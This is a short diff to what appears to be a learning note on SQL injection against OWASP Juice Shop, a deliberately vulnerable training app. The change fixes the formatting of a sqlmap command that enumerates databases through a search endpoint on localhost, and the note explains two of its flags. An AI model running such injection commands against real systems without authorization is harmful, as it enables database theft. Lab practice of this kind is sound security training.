@@ -3,7 +3,7 @@
 These examples are referencing OWASP Juice Shop where I performed an SQLite Dump
 
 ## Simple command 
-`` sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs
+`sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs
 
 **--batch = auto answer defaults (so it doesn’t prompt you)
 --dbs = enumerate databases**
